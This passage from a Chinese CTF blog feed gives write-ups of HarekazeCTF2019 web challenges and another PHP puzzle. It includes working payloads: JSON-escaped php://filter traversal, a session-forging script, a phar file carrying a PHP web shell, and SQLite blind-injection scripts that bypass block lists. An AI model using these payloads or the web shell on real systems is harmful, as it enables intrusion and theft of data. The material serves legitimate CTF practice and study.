srcset="/img/loading.gif" alt="1573282550159"></p><p><img src="./1573282203206.png" srcset="/img/loading.gif" alt="1573282203206"></p><p>#　大数据安全</p><p>payload一把搞</p><p><a href="https://zhuanlan.zhihu.com/p/33681712" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/33681712</a></p><p><img src="./1573289387581.png" srcset="/img/loading.gif" alt="1573289387581"></p><h1 id="工控安全"><a href="#工控安全" class="headerlink" title="工控安全"></a>工控安全</h1><p>根据apache2 php-cgi漏洞　/index.php-s获取源码</p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);session_start();<span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">'username'</span>] === <span class="hljs-string">'admin'</span> &amp;&amp; $_POST[<span class="hljs-string">'password'</span>] === <span class="hljs-string">'admin'</span>)&#123;   <span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">'vcode'</span>] == $_POST[<span class="hljs-string">'vcode'</span>])&#123;    header(<span class="hljs-string">'Location: main.php'</span>);    $_SESSION[<span class="hljs-string">'vcode'</span>]-&gt;close();  &#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script&gt;alert('vcode error!');&lt;/script&gt;"</span>;    $_SESSION[<span class="hljs-string">'vcode'</span>]-&gt;close();  &#125;&#125;$secert = <span class="hljs-number">6666672</span>;$keylen = <span class="hljs-number">80</span>;$keyone = $_GET[<span class="hljs-string">'keyone'</span>];<span class="hljs-keyword">if</span>(strlen($keyone) === $keylen)&#123;    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/^\d+＄/'</span>, $keyone) &amp;&amp; !is_numeric($keyone))&#123;        <span class="hljs-keyword">if</span>($keyone == $secert)&#123;            @$secert = $_GET[<span class="hljs-string">'cc'</span>];            <span class="hljs-keyword">if</span>(strstr($_SERVER[<span class="hljs-string">'REQUEST_URI'</span>],<span class="hljs-string">'You_Are_Cool'</span>))&#123;                    <span class="hljs-keyword">exit</span>();            &#125;            $f = $_FILES[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>];            <span class="hljs-keyword">if</span>(mime_content_type($f) == <span class="hljs-string">'application/vnd.font-fontforge-sfd'</span>)&#123;                $filename = $_GET[<span class="hljs-string">'You_Are_Cool'</span>];                <span class="hljs-keyword">if</span>(!strstr($filename,<span class="hljs-string">"."</span>))&#123;                    file_put_contents(<span class="hljs-string">'/tmp/'</span>.$filename,$secert);                &#125;            &#125;        &#125;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><pre><code class="hljs llvm">参考链接：payload:<span class="hljs-symbol">%59</span>ou_Are_Cool=<span class="hljs-number">1</span>&amp;keyone=<span class="hljs-number">00000000000000000000000000000000000000000000000000000000000000000000006666672</span><span class="hljs-symbol">%EF</span><span class="hljs-symbol">%BC</span><span class="hljs-symbol">%84</span>&amp;<span class="hljs-keyword">cc</span>=aa</code></pre><ol><li><p><code>＄</code> 畸形的正则结尾，在利用php弱类型绕过,<code>$keyone == $secert</code></p><p><code>keyone=00000000000000000000000000000000000000000000000000000000000000000000006666672%EF%BC%84</code></p></li><li><p>strstr($_SERVER[‘REQUEST_URI’],’You_Are_Cool’),该处直接对<code>Y</code> Url编码绕过</p></li><li><p>mime_content_type($f) == ‘application/vnd.font-fontforge-sfd’</p><p>该处绕过在文件上传处开头添加<code>SplineFontDB: 3.0</code> </p></li></ol><p>之后该处<code>file_put_contents(&#39;/tmp/&#39;.$filename,$secert);</code>不知如何利用，总感觉有源码泄露但是没找到。等后面补上来.</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HarekazeCTF2019 | WEB题解</title>
    <link href="/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/"/>
    <url>/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>日常精准复现CTF</p><h1 id="encode-and-encode"><a href="#encode-and-encode" class="headerlink" title="encode_and_encode"></a>encode_and_encode</h1><p>考点：编码json转义unicode编码绕过</p><p>题解：<a href="https://ctftime.org/writeup/15459" target="_blank" rel="noopener">https://ctftime.org/writeup/15459</a></p><p><a href="https://xz.aliyun.com/t/6628" target="_blank" rel="noopener">https://xz.aliyun.com/t/6628</a></p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'source'</span>])) &#123;  show_source(<span class="hljs-keyword">__FILE__</span>);  <span class="hljs-keyword">exit</span>();&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span><span class="hljs-params">($str)</span> </span>&#123;  $banword = [    <span class="hljs-comment">// no path traversal</span>    <span class="hljs-string">'\.\.'</span>,    <span class="hljs-comment">// no stream wrapper</span>    <span class="hljs-string">'(php|file|glob|data|tp|zip|zlib|phar):'</span>,    <span class="hljs-comment">// no data exfiltration</span>    <span class="hljs-string">'flag'</span>  ];  $regexp = <span class="hljs-string">'/'</span> . implode(<span class="hljs-string">'|'</span>, $banword) . <span class="hljs-string">'/i'</span>;  <span class="hljs-keyword">if</span> (preg_match($regexp, $str)) &#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;&#125;$body = file_get_contents(<span class="hljs-string">'php://input'</span>);$json = json_decode($body, <span class="hljs-keyword">true</span>);<span class="hljs-keyword">if</span> (is_valid($body) &amp;&amp; <span class="hljs-keyword">isset</span>($json) &amp;&amp; <span class="hljs-keyword">isset</span>($json[<span class="hljs-string">'page'</span>])) &#123;  $page = $json[<span class="hljs-string">'page'</span>];  $content = file_get_contents($page);  <span class="hljs-keyword">if</span> (!$content || !is_valid($content)) &#123;    $content = <span class="hljs-string">"&lt;p&gt;not found&lt;/p&gt;\n"</span>;  &#125;&#125; <span class="hljs-keyword">else</span> &#123;  $content = <span class="hljs-string">'&lt;p&gt;invalid request&lt;/p&gt;'</span>;&#125;<span class="hljs-comment">// no data exfiltration!!!</span>$content = preg_replace(<span class="hljs-string">'/HarekazeCTF\&#123;.+\&#125;/i'</span>, <span class="hljs-string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span>, $content);<span class="hljs-keyword">echo</span> json_encode([<span class="hljs-string">'content'</span> =&gt; $content]);</code></pre><p>is_valid过滤危险字符，但是可以发现if语句中作用的is_valid是还未被json_decode解码。</p><p>利用json转义格式\u00(url编码字符)绕过</p><pre><code class="hljs livescript">. =&gt; <span class="hljs-string">\u002e</span>      F =&gt; <span class="hljs-string">\u0066</span></code></pre><p><img src="./1573041252425.png" srcset="/img/loading.gif" alt="1573041252425"></p><p>最终paylaod</p><pre><code class="hljs json">&#123;    <span class="hljs-attr">"page"</span>: <span class="hljs-string">"php://filter/convert.base64-encode/resource=\u002e\u002e/\u002e\u002e/\u002e\u002e/\u002e\u002e/\u0066lag"</span>&#125;</code></pre><h1 id="easy-notes"><a href="#easy-notes" class="headerlink" title="easy_notes"></a>easy_notes</h1><p>考点：session反序列化</p><p>export.php,会使用ZipArchive或PharData创建文件并写入note内容(可控)。再看生成的filename方法get_user()返回注册的用户名。且这里过了了<code>..</code>无法遍历目录。文件内容会通过回显示头带入</p><p><img src="./1573114337001.png" srcset="/img/loading.gif" alt="1573114337001"></p><p>$note值会将传入的$title、$body压入$_SESSION[‘notes’]数组</p><p><img src="./1573112891671.png" srcset="/img/loading.gif" alt="1573112891671"></p><p>flag.php,得到flag需要得到验证函数is_admin</p><p><img src="/media/osword/081D145C081D145C/%E5%A4%87%E4%BB%BD/Nutstore%20Files/Typora/ctf/HarekazeCTF2019.assets/1573114568489.png" srcset="/img/loading.gif" alt="1573114568489"></p><p>这里需要$_SESSION[‘admin’]==true是个布尔值</p><p><img src="./1573114654589.png" srcset="/img/loading.gif" alt="1573114654589"></p><p>考点明显是通过后端解析引擎差异对session进行反序列化。伪造session文件sess_axxxxxxx，写入<code>|N;admin|b:1;</code>，在以该文件名除去sess_作为cookie去访问flag文件触发反序列化，成功伪造admin身份，得到flag</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> requestsURL = <span class="hljs-string">'http://b745d7be-e0af-433d-9670-7c5b773aa47b.node3.buuoj.cn/'</span><span class="hljs-comment"># login as sess_</span>sess = requests.Session()sess.post(URL + <span class="hljs-string">'login.php'</span>, data=&#123;    <span class="hljs-string">'user'</span>: <span class="hljs-string">'sess_aaaa'</span>&#125;)  <span class="hljs-comment"># make a crafted note</span>sess.post(URL + <span class="hljs-string">'add.php'</span>, data=&#123;    <span class="hljs-string">'title'</span>: <span class="hljs-string">'name|s:3:"456";admin|b:1;'</span>,    <span class="hljs-string">'body'</span>: <span class="hljs-string">'hello'</span>&#125;)  <span class="hljs-comment"># make a fake session</span>r = sess.get(URL + <span class="hljs-string">'export.php?type=.'</span>).headers[<span class="hljs-string">'Content-Disposition'</span>]sessid = re.findall(<span class="hljs-string">r'sess_([0-9a-z-]+)'</span>, r)[<span class="hljs-number">0</span>]  <span class="hljs-comment"># get the flag</span>r = requests.get(URL + <span class="hljs-string">'?page=flag'</span>, cookies=&#123;    <span class="hljs-string">'PHPSESSID'</span>: sessid&#125;)print(r.text)</code></pre><p><img src="./1573116094276.png" srcset="/img/loading.gif" alt="1573116094276"></p><h1 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h1><p>关键代码如下</p><p>分别使用finfo_file和getimagesize判断文件类型很是奇怪，考虑执行差异。</p><p><img src="./1573125060507.png" srcset="/img/loading.gif" alt="1573125060507"></p><p>传入如下文件</p><p>本地测试时候发现finfo可以读取到类型，但是getimagesize无法识别，利用此绕过<code>$size[2] !== IMAGETYPE_PNG</code></p><p><img src="./1573125130532.png" srcset="/img/loading.gif" alt="1573125130532"></p><p><img src="./1573125144393.png" srcset="/img/loading.gif" alt="1573125144393"></p><p>flag</p><p><img src="./1573125218861.png" srcset="/img/loading.gif" alt="1573125218861"></p><h1 id="HarekazeCTF2019-Avatar-Uploader-2"><a href="#HarekazeCTF2019-Avatar-Uploader-2" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 2"></a>[HarekazeCTF2019]Avatar Uploader 2</h1><p>考点：代码审计、phar反序列化、函数缺陷</p><p>hint:<a href="https://www.php.net/manual/ja/function.password-hash.php" target="_blank" rel="noopener">https://www.php.net/manual/ja/function.password-hash.php</a></p><p>upload.php：中FLAG1已经在upload1 利用结束</p><p>如下为session生成方法，构造方法中可以看出设置的cookie值是由明文data和加密后的data以<code>.</code>拼接</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SecureClientSession</span> </span>&#123;  <span class="hljs-keyword">private</span> $cookieName;  <span class="hljs-keyword">private</span> $secret;  <span class="hljs-keyword">private</span> $data;  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($cookieName = <span class="hljs-string">'session'</span>, $secret = <span class="hljs-string">'secret'</span>)</span> </span>&#123;    <span class="hljs-keyword">$this</span>-&gt;data = [];    <span class="hljs-keyword">$this</span>-&gt;secret = $secret;    <span class="hljs-keyword">if</span> (array_key_exists($cookieName, $_COOKIE)) &#123;      <span class="hljs-keyword">try</span> &#123;        <span class="hljs-keyword">list</span>($data, $signature) = explode(<span class="hljs-string">'.'</span>, $_COOKIE[$cookieName]);        $data = urlsafe_base64_decode($data);        $signature = urlsafe_base64_decode($signature);            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;verify($data, $signature)) &#123;          <span class="hljs-keyword">$this</span>-&gt;data = json_decode($data, <span class="hljs-keyword">true</span>);        &#125;      &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-keyword">Exception</span> $e) &#123;&#125;    &#125;      <span class="hljs-keyword">$this</span>-&gt;cookieName = $cookieName;  &#125;  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isset</span><span class="hljs-params">($key)</span> </span>&#123;    <span class="hljs-keyword">return</span> array_key_exists($key, <span class="hljs-keyword">$this</span>-&gt;data);  &#125;  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">($key, $defaultValue = null)</span></span>&#123;    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;isset($key)) &#123;      <span class="hljs-keyword">return</span> $defaultValue;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;data[$key];  &#125;  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span><span class="hljs-params">($key, $value)</span></span>&#123;    <span class="hljs-keyword">$this</span>-&gt;data[$key] = $value;  &#125;  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unset</span><span class="hljs-params">($key)</span> </span>&#123;    <span class="hljs-keyword">unset</span>(<span class="hljs-keyword">$this</span>-&gt;data[$key]);  &#125;  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span><span class="hljs-params">()</span> </span>&#123;    $json = json_encode(<span class="hljs-keyword">$this</span>-&gt;data);    $value = urlsafe_base64_encode($json) . <span class="hljs-string">'.'</span> . urlsafe_base64_encode(<span class="hljs-keyword">$this</span>-&gt;sign($json));    setcookie(<span class="hljs-keyword">$this</span>-&gt;cookieName, $value);  &#125;  <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify</span><span class="hljs-params">($string, $signature)</span> </span>&#123;    <span class="hljs-keyword">return</span> password_verify(<span class="hljs-keyword">$this</span>-&gt;secret . $string, $signature);  &#125;  <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sign</span><span class="hljs-params">($string)</span> </span>&#123;    <span class="hljs-keyword">return</span> password_hash(<span class="hljs-keyword">$this</span>-&gt;secret . $string, PASSWORD_BCRYPT);  &#125;&#125;</code></pre><p>再看sign方法中password_hash函数对第一个参数长度超过72会截断，也暗示着如果超出72字节的部分加密后的结果与72字节相同</p><p><img src="./1573129972732.png" srcset="/img/loading.gif" alt="1573129972732"></p><p>再看error方法，$message赋值到$session设置中，输出之后的data值是超过72字节</p><p><img src="./1573130886081.png" srcset="/img/loading.gif" alt="1573130886081"></p><p><img src="./1573130861491.png" srcset="/img/loading.gif" alt="1573130861491"></p><p>一处可以利用的点，include可以触发phar包写一句话木马</p><p>可以向theme键value值替换为需要包含的文件路径,在加上error方法导致的长度大于72，可以控制data部分值，并且绕过签名验证。</p><p><img src="./1573129102382.png" srcset="/img/loading.gif" alt="1573129102382"></p><p><img src="./1573129084102.png" srcset="/img/loading.gif" alt="1573129084102"></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>phar包构造,需要构造$png_header绕过upload.php两个图片验证，写入exp.css文件带有一句话木马</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">//89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</span>$png_header = hex2bin(<span class="hljs-string">'89504e470d0a1a0a0000000d49484452000000400000004000'</span>);$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">'exp.phar'</span>);$phar-&gt;startBuffering();$phar-&gt;addFromString(<span class="hljs-string">'exp.css'</span>, <span class="hljs-string">'&lt;?php system($_GET["cmd"]); ?&gt;'</span>);$phar-&gt;setStub($png_header . <span class="hljs-string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);$phar-&gt;stopBuffering();</code></pre><p><img src="./1573189902248.png" srcset="/img/loading.gif" alt="1573189902248"></p><p>上传该phar包</p><p><img src="./1573189920227.png" srcset="/img/loading.gif" alt="1573189920227"></p><p>赋值新生成的session，进行进一步伪造，增加theme键</p><p><img src="./1573190007834.png" srcset="/img/loading.gif" alt="1573190007834"></p><p>替换原来的data值,index.php包含之，就能够执行命令</p><p><img src="./1573190100617.png" srcset="/img/loading.gif" alt="1573190100617"></p><p><img src="./1573189601089.png" srcset="/img/loading.gif" alt="1573189601089"></p><p><strong>flag</strong></p><p><img src="./1573189633670.png" srcset="/img/loading.gif" alt="1573189633670"></p><h1 id="Sqlite-Voting"><a href="#Sqlite-Voting" class="headerlink" title="Sqlite Voting"></a>Sqlite Voting</h1><p>考点：逻辑报错、sql注入、sqlite、过滤绕过</p><p>sqlite函数列表：<a href="https://www.sqlite.org/lang_corefunc.html" target="_blank" rel="noopener">https://www.sqlite.org/lang_corefunc.html</a></p><p><img src="./1573196682665.png" srcset="/img/loading.gif" alt="1573196682665"></p><p>vote.php</p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'source'</span>])) &#123;  show_source(<span class="hljs-keyword">__FILE__</span>);  <span class="hljs-keyword">exit</span>();&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span><span class="hljs-params">($str)</span> </span>&#123;  $banword = [    <span class="hljs-comment">// dangerous chars</span>    <span class="hljs-comment">// " % ' * + / &lt; = &gt; \ _ ` ~ -</span>    <span class="hljs-string">"[\"%'*+\\/&lt;=&gt;\\\\_`~-]"</span>,    <span class="hljs-comment">// whitespace chars</span>    <span class="hljs-string">'\s'</span>,    <span class="hljs-comment">// dangerous functions</span>    <span class="hljs-string">'blob'</span>, <span class="hljs-string">'load_extension'</span>, <span class="hljs-string">'char'</span>, <span class="hljs-string">'unicode'</span>,    <span class="hljs-string">'(in|sub)str'</span>, <span class="hljs-string">'[lr]trim'</span>, <span class="hljs-string">'like'</span>, <span class="hljs-string">'glob'</span>, <span class="hljs-string">'match'</span>, <span class="hljs-string">'regexp'</span>,    <span class="hljs-string">'in'</span>, <span class="hljs-string">'limit'</span>, <span class="hljs-string">'order'</span>, <span class="hljs-string">'union'</span>, <span class="hljs-string">'join'</span>  ];  $regexp = <span class="hljs-string">'/'</span> . implode(<span class="hljs-string">'|'</span>, $banword) . <span class="hljs-string">'/i'</span>;  <span class="hljs-keyword">if</span> (preg_match($regexp, $str)) &#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;&#125;header(<span class="hljs-string">"Content-Type: text/json; charset=utf-8"</span>);<span class="hljs-comment">// check user input</span><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'id'</span>]) || <span class="hljs-keyword">empty</span>($_POST[<span class="hljs-string">'id'</span>])) &#123;  <span class="hljs-keyword">die</span>(json_encode([<span class="hljs-string">'error'</span> =&gt; <span class="hljs-string">'You must specify vote id'</span>]));&#125;$id = $_POST[<span class="hljs-string">'id'</span>];<span class="hljs-keyword">if</span> (!is_valid($id)) &#123;  <span class="hljs-keyword">die</span>(json_encode([<span class="hljs-string">'error'</span> =&gt; <span class="hljs-string">'Vote id contains dangerous chars'</span>]));&#125;<span class="hljs-comment">// update database</span>$pdo = <span class="hljs-keyword">new</span> PDO(<span class="hljs-string">'sqlite:../db/vote.db'</span>);$res = $pdo-&gt;query(<span class="hljs-string">"UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;"</span>);<span class="hljs-keyword">if</span> ($res === <span class="hljs-keyword">false</span>) &#123;  <span class="hljs-keyword">die</span>(json_encode([<span class="hljs-string">'error'</span> =&gt; <span class="hljs-string">'An error occurred while updating database'</span>]));&#125;<span class="hljs-comment">// succeeded!</span><span class="hljs-keyword">echo</span> json_encode([  <span class="hljs-string">'message'</span> =&gt; <span class="hljs-string">'Thank you for your vote! The result will be published after the CTF finished.'</span>]);</code></pre><p>根据源码，创建模拟数据方便测试</p><pre><code class="hljs sql"><span class="hljs-comment"># 安装:sudo apt install sqlite3</span><span class="hljs-comment"># 模拟数据创建</span>sqlite&gt; DROP TABLE IF EXISTS `vote`;sqlite&gt; CREATE TABLE `vote` (   ...&gt;   `id` INTEGER PRIMARY KEY AUTOINCREMENT,   ...&gt;   `name` TEXT NOT NULL,   ...&gt;   `count` INTEGER   ...&gt; );sqlite&gt; INSERT INTO `vote` (`name`, `count`) VALUES   ...&gt;   ('dog', 0),   ...&gt;   ('cat', 0),   ...&gt;   ('zebra', 0),   ...&gt;   ('koala', 0);sqlite&gt; create table flag (flag text);sqlite&gt; insert into flag values ('HarekazeCTF&#123;test&#125;');</code></pre><p>解题思路是利用sqlite逻辑报错进行盲注,abs函数存在整型溢出</p><p>利用ifnull,nullif注入flag长度</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">"http://236fd178-f35e-4f3e-88e0-70374086e68c.node3.buuoj.cn/vote.php"</span><span class="hljs-comment"># get flag length</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):    data = &#123;        <span class="hljs-string">'id'</span>:<span class="hljs-string">f'abs(ifnull(nullif(length((SELECT(flag)from(flag))),<span class="hljs-subst">&#123;i&#125;</span>),0x8000000000000000))'</span>    &#125;    rep = requests.post(url,data=data)    print(data)    <span class="hljs-keyword">if</span> <span class="hljs-string">'An error occurred'</span> <span class="hljs-keyword">in</span> rep.text:        print(<span class="hljs-string">'length: '</span>+str(i))        <span class="hljs-keyword">break</span></code></pre><p><img src="./1573196707908.png" srcset="/img/loading.gif" alt="1573196707908"></p><p>在平常做盲注都需要字符截取进行逐位判断，但这里过滤了字符截取函数，可以使用||连接字符</p><p><img src="./1573198578923.png" srcset="/img/loading.gif" alt="1573198578923"></p><p>考虑使用replace+length替换substr，逻辑如下,需要知道flag前几个字符,在逐位猜解</p><p><img src="./1573198633285.png" srcset="/img/loading.gif" alt="1573198633285"></p><p>但是单引号双引号被过滤，还有能替换的只有hex函数，但是字符拼接0-9无需单引号，但是字符A-Z需要单双引号，可以去数据库中取</p><pre><code class="hljs python">table = &#123;&#125;table[<span class="hljs-string">'A'</span>] = <span class="hljs-string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span> <span class="hljs-comment"># 'zebra' → '7A65627261'</span>table[<span class="hljs-string">'C'</span>] = <span class="hljs-string">'trim(hex(typeof(.1)),12567)'</span> <span class="hljs-comment"># 'real' → '7265616C'</span>table[<span class="hljs-string">'D'</span>] = <span class="hljs-string">'trim(hex(0xffffffffffffffff),123)'</span> <span class="hljs-comment"># 0xffffffffffffffff = -1 → '2D31'</span>table[<span class="hljs-string">'E'</span>] = <span class="hljs-string">'trim(hex(0.1),1230)'</span> <span class="hljs-comment"># 0.1 → 302E31</span>table[<span class="hljs-string">'F'</span>] = <span class="hljs-string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span> <span class="hljs-comment"># 'dog' → '646F67'</span>table[<span class="hljs-string">'B'</span>] = <span class="hljs-string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="hljs-subst">&#123;table[<span class="hljs-string">"C"</span>]&#125;</span>||<span class="hljs-subst">&#123;table[<span class="hljs-string">"F"</span>]&#125;</span>)'</span> <span class="hljs-comment"># 'koala' → '6B6F616C61'</span></code></pre><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>参考连接：<a href="https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html#web-350-sqlite-voting" target="_blank" rel="noopener">https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html#web-350-sqlite-voting</a></p><pre><code class="hljs python"><span class="hljs-comment"># coding: utf-8</span><span class="hljs-keyword">import</span> binascii<span class="hljs-keyword">import</span> requestsURL = <span class="hljs-string">'http://236fd178-f35e-4f3e-88e0-70374086e68c.node3.buuoj.cn/vote.php'</span><span class="hljs-comment"># フラグの長さを特定</span>l = <span class="hljs-number">0</span>i = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">16</span>):  r = requests.post(URL, data=&#123;    <span class="hljs-string">'id'</span>: <span class="hljs-string">f'abs(case(length(hex((select(flag)from(flag))))&amp;<span class="hljs-subst">&#123;<span class="hljs-number">1</span>&lt;&lt;j&#125;</span>)when(0)then(0)else(0x8000000000000000)end)'</span>  &#125;)  <span class="hljs-keyword">if</span> <span class="hljs-string">b'An error occurred'</span> <span class="hljs-keyword">in</span> r.content:    l |= <span class="hljs-number">1</span> &lt;&lt; jprint(<span class="hljs-string">'[+] length:'</span>, l)<span class="hljs-comment"># A-F のテーブルを作成</span>table = &#123;&#125;table[<span class="hljs-string">'A'</span>] = <span class="hljs-string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span>table[<span class="hljs-string">'C'</span>] = <span class="hljs-string">'trim(hex(typeof(.1)),12567)'</span>table[<span class="hljs-string">'D'</span>] = <span class="hljs-string">'trim(hex(0xffffffffffffffff),123)'</span>table[<span class="hljs-string">'E'</span>] = <span class="hljs-string">'trim(hex(0.1),1230)'</span>table[<span class="hljs-string">'F'</span>] = <span class="hljs-string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span>table[<span class="hljs-string">'B'</span>] = <span class="hljs-string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="hljs-subst">&#123;table[<span class="hljs-string">"C"</span>]&#125;</span>||<span class="hljs-subst">&#123;table[<span class="hljs-string">"F"</span>]&#125;</span>)'</span><span class="hljs-comment"># フラグをゲット!</span>res = binascii.hexlify(<span class="hljs-string">b'flag&#123;'</span>).decode().upper()<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(res), l):  <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-string">'0123456789ABCDEF'</span>:    t = <span class="hljs-string">'||'</span>.join(c <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">'0123456789'</span> <span class="hljs-keyword">else</span> table[c] <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> res + x)    print(t)    r = requests.post(URL, data=&#123;      <span class="hljs-string">'id'</span>: <span class="hljs-string">f'abs(case(replace(length(replace(hex((select(flag)from(flag))),<span class="hljs-subst">&#123;t&#125;</span>,trim(0,0))),<span class="hljs-subst">&#123;l&#125;</span>,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'</span>    &#125;)    <span class="hljs-keyword">if</span> <span class="hljs-string">b'An error occurred'</span> <span class="hljs-keyword">in</span> r.content:      res += x      <span class="hljs-keyword">break</span>  print(<span class="hljs-string">f'[+] flag (<span class="hljs-subst">&#123;i&#125;</span>/<span class="hljs-subst">&#123;l&#125;</span>): <span class="hljs-subst">&#123;res&#125;</span>'</span>)  i += <span class="hljs-number">1</span>print(<span class="hljs-string">'[+] flag:'</span>, binascii.unhexlify(res).decode())</code></pre><p>还有一个解是利用max函数</p><pre><code class="hljs sqf">假设前几位为<span class="hljs-built_in">flag</span>&#123; =&gt; hex(<span class="hljs-string">'flag&#123;&#125;'</span>) =&gt;<span class="hljs-number">666</span>C61677B =&gt; 之后在拼接上<span class="hljs-number">0</span>*剩余<span class="hljs-built_in">flag</span>长度=&gt;在用<span class="hljs-built_in">max</span>函数逐位去比较逻辑如下<span class="hljs-built_in">abs</span>(ifnull(nullif(<span class="hljs-built_in">max</span>(hex(hex((<span class="hljs-built_in">SELECT</span>(<span class="hljs-built_in">flag</span>)<span class="hljs-keyword">from</span>(<span class="hljs-built_in">flag</span>)))),$NUMBER$),$NUMBER$),<span class="hljs-number">0</span>x8000000000000000))</code></pre><p>链接：<a href="https://gist.github.com/terjanq/a571826c6bb08ae0dfa4ef57e03b5b72#solution" target="_blank" rel="noopener">https://gist.github.com/terjanq/a571826c6bb08ae0dfa4ef57e03b5b72#solution</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>盲注过滤字符截取考虑replace+length、max等其他逻辑，不要拘泥字符穿截取函数</li><li>字符串编码和过滤函数不正确放置，能绕过限制</li><li>phar包不仅仅可以反序列化，在phar中放入文件，phar://uploads/xxx.phar(png)/exp.css，在exp.css放入一句话木马，使用inlude触发，可以执行代码</li><li>getimagesieze与finfo_file判断图片类型有差异，finfo_file可以识别第一行图片类型，getimagesize无法识别</li><li>在审计一道题目时候，先分析出漏洞点，在考虑其他方面</li><li>password_hash只对前72字符加密，由于截取字符的缘故，造成session伪造</li><li>sqlite3中<code>||</code> 可以起到字符拼接的作用</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>对现代WEB框架/CMS审计思考</title>
    <link href="/2019/11/04/%E5%AF%B9%E7%8E%B0%E4%BB%A3WEB%E6%A1%86%E6%9E%B6-CMS%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%80%83/"/>
